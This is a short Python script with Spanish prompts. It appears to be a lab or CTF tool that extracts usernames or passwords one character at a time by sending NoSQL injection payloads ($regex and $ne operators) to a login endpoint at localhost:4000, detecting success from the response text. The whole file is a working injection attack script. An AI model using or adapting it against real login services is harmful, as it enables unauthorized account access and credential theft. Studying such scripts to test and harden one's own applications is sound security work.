#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

# ctrl_c
def def_handler(sig, frame):
        print ("\n\n[!] Saliendo...")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

data_selec = int(input("\n[1] Listar usuarios\n[2] Listar contraseñas\nSeleccionar modalidad: "))
if data_selec == 1:
        query = '{"username":{"$regex":"^%s%s"},"password":{"$ne":""}}'
elif data_selec == 2:
        username = input("\nIngrese un usuario objetivo: ").strip()
        query = '{"username": "' + username + '","password":{"$regex":"^%s%s"}}'
# Variables globales
url_target = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():

        passwd=""
        p1 = log.progress("FUZZnoSQLi")
        p1.status("Iniciando Inyección")
        time.sleep(2)
        p2 = log.progress("Contraseña: ")

        for position in range(1, 50):
                for ch4r in characters:
                        data = query % (passwd, ch4r)
                        p1.status(data)
                        headers = {'Content-Type': 'application/json'}
                        r = requests.post(url_target, headers=headers, data=data)
                        if "Logged in as user" in r.text:
                                passwd += ch4r
                                p2.status(passwd)
                                break


if __name__ == '__main__':
        makeNoSQLI()
